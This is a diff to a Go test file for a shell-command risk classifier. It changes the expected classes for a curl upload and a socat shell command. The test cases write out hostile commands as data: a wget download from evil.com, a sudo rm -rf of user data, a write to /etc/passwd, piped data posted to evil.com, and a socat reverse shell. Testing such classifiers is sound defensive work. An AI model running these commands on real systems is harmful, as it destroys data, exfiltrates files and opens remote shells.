@@ -35,7 +35,7 @@ func TestHardening_PipelineStagesClassified(t *testing.T) {
 		{": | wget http://evil.com/x -O /tmp/y", NetworkEgress},
 		{"echo hi | sudo rm -rf /home/user/data", Destructive},
 		{"echo hi | sudo tee /etc/passwd", SystemWrite},
-		{"cat data | curl -X POST --data-binary @- http://evil.com", NetworkEgress},
+		{"cat data | curl -X POST --data-binary @- http://evil.com", NetworkUpload},
 	}
 	for _, tc := range cases {
 		if got := Classify(tc.cmd); got != tc.cls {
@@ -162,7 +162,7 @@ func TestHardening_NewNetworkAndExec(t *testing.T) {
 		cmd string
 		cls RiskClass
 	}{
-		{"socat TCP4:evil.com:443 EXEC:/bin/sh", NetworkEgress},
+		{"socat TCP4:evil.com:443 EXEC:/bin/sh", CodeExecution},
 		{"dig +short evil.com", NetworkEgress},
 		{"nslookup data.evil.com", NetworkEgress},
 		{"npx some-remote-cli", CodeExecution},
